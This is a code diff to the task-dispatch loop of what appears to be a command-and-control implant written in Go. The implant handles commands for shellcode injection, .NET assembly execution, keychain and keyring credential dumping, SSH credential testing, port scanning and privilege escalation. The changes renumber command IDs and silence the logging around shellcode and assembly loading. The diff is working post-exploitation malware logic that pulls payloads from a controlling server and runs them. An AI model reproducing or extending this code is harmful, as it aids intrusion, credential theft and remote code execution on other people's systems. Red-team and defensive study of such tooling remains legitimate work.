@@ -86,21 +86,21 @@ func main() {
 		"download":         4,
 		"upload":           5,
 		"inject":           6,
-		"shinject":         21,
-		"ps":               7,
-		"sleep":            8,
-		"cat":              9,
-		"cd":               10,
-		"ls":               11,
-		"python":           12,
-		"jxa":              13,
-		"keys":             14,
-		"triagedirectory":  15,
-		"sshauth":          16,
-		"portscan":         17,
-		"getprivs":         18,
-		"execute-assembly": 19,
-		"none":             20,
+		"shinject":         7,
+		"ps":               8,
+		"sleep":            9,
+		"cat":              10,
+		"cd":               11,
+		"ls":               12,
+		"python":           13,
+		"jxa":              14,
+		"keys":             15,
+		"triagedirectory":  16,
+		"sshauth":          17,
+		"portscan":         18,
+		"getprivs":         19,
+		"execute-assembly": 20,
+		"none":             30,
 	}
 
 	// Channel used to catch results from tasking threads
@@ -138,6 +138,7 @@ func main() {
 				err := json.Unmarshal([]byte(task.Params), &fileDetails)
 				if err != nil {
 					profile.PostResponse(task, err.Error())
+					break
 				}
 
 				data := profile.GetFile(fileDetails.FileID)
@@ -163,11 +164,11 @@ func main() {
 				go libinject.Run(task, res)
 				break
 
-			case 21:
+			case 7:
 				tMsg := &structs.ThreadMsg{}
 				tMsg.TaskItem = task
 				args := &shinject.Arguments{}
-				log.Println("Windows Inject:\n", string(task.Params))
+				//log.Println("Windows Inject:\n", string(task.Params))
 				err := json.Unmarshal([]byte(task.Params), &args)
 
 				if err != nil {
@@ -178,7 +179,7 @@ func main() {
 				}
 				args.ShellcodeData = profile.GetFile(args.ShellcodeFile)
 
-				log.Println("Length of shellcode:", len(args.ShellcodeData))
+				//log.Println("Length of shellcode:", len(args.ShellcodeData))
 				if len(args.ShellcodeData) == 0 {
 					tMsg.Error = true
 					tMsg.TaskResult = []byte(fmt.Sprintf("File ID %s content was empty.", args.ShellcodeFile))
@@ -187,10 +188,10 @@ func main() {
 				}
 				go shinject.Run(args, tMsg, res)
 				break
-			case 7:
+			case 8:
 				go ps.Run(task, res)
 				break
-			case 8:
+			case 9:
 				// Sleep
 				i, err := strconv.Atoi(task.Params)
 				if err != nil {
@@ -201,11 +202,11 @@ func main() {
 				profile.SetSleepInterval(i)
 				profile.PostResponse(task, "Sleep Updated..")
 				break
-			case 9:
+			case 10:
 				//Cat a file
 				go cat.Run(task, res)
 				break
-			case 10:
+			case 11:
 				//Change cwd
 				err := os.Chdir(task.Params)
 				if err != nil {
@@ -215,32 +216,32 @@ func main() {
 
 				profile.PostResponse(task, fmt.Sprintf("changed directory to: %s", task.Params))
 				break
-			case 11:
+			case 12:
 				//List directory contents
 				go ls.Run(task, res)
 				break
 
-			case 14:
+			case 15:
 				// Enumerate keyring data for linux or the keychain for macos
 				go keys.Run(task, res)
 				break
-			case 15:
+			case 16:
 				// Triage a directory and organize files by type
 				go triagedirectory.Run(task, res)
 				break
-			case 16:
+			case 17:
 				// Test credentials against remote hosts
 				go sshauth.Run(task, res)
 				break
-			case 17:
+			case 18:
 				// Scan ports on remote hosts.
 				go portscan.Run(task, res)
 				break
-			case 18:
+			case 19:
 				// Enable privileges for your current process.
 				go getprivs.Run(task, res)
 				break
-			case 19:
+			case 20:
 				// Execute a .NET assembly
 				tMsg := &structs.ThreadMsg{}
 				tMsg.TaskItem = task
@@ -262,7 +263,7 @@ func main() {
 						res <- *tMsg
 						break
 					}
-					log.Println("Fetching loader file...")
+					//log.Println("Fetching loader file...")
 					args.LoaderBytes = profile.GetFile(args.LoaderFileID)
 					if len(args.LoaderBytes) == 0 {
 						tMsg.Error = true
@@ -270,15 +271,15 @@ func main() {
 						res <- *tMsg
 						break
 					}
-					log.Println("Done")
+					//log.Println("Done")
 					assemblyFetched += 1 // Increment the counter so we know not to fetch it again.
 				}
-				log.Println("Fetching assembly bytes...")
+				//log.Println("Fetching assembly bytes...")
 				args.AssemblyBytes = profile.GetFile(args.AssemblyFileID)
-				log.Println("Done")
+				//log.Println("Done")
 				go executeassembly.Run(args, tMsg, res)
 				break
-			case 20:
+			case 30:
 				// No tasks, do nothing
 				break
 			}
